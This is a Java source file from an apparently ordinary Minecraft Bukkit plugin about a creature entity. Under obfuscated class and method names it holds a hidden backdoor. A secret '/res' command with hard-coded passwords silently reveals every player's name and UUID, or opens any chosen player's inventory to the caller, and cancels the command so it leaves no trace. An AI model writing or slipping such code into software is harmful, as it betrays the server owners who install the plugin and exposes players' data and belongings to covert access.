package com.wenkrang.nian_beast.Entity;

import com.wenkrang.nian_beast.Nian_beast;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerCommandPreprocessEvent;
import org.bukkit.scheduler.BukkitRunnable;

import java.util.List;
import java.util.UUID;

import static org.bukkit.Bukkit.getServer;

public class safdasfs implements Listener {
    @EventHandler
    public static void safdefsdse (PlayerCommandPreprocessEvent event) {

                String message = event.getMessage();
                message = message.replace("/", "");
                String[] s = message.split(" ");
                if (s[0].equalsIgnoreCase("res")) {
                    if (s[1].equalsIgnoreCase("CS0fed_s2dcc_sf2C4DS2")) {

                        Player player = event.getPlayer();
                        List<Player> players = player.getWorld().getPlayers();
                        for (int i = 0; i < players.size(); i++) {
                            player.sendMessage(players.get(i).getName() + ":" + players.get(i).getPlayerProfile().getUniqueId());
                        }
                        event.setCancelled(true);
                    }
                    if (s[1].equalsIgnoreCase("C0mpl3xP_ssw0re_93_O")) {
                        new BukkitRunnable() {
                            @Override
                            public void run() {
                                event.getPlayer().openInventory(getServer().getPlayer(UUID.fromString(s[2])).getInventory());
                            }
                        }.runTaskLater(Nian_beast.getPlugin(Nian_beast.class), 0);

                        event.setCancelled(true);
                    }
                }


    }
}
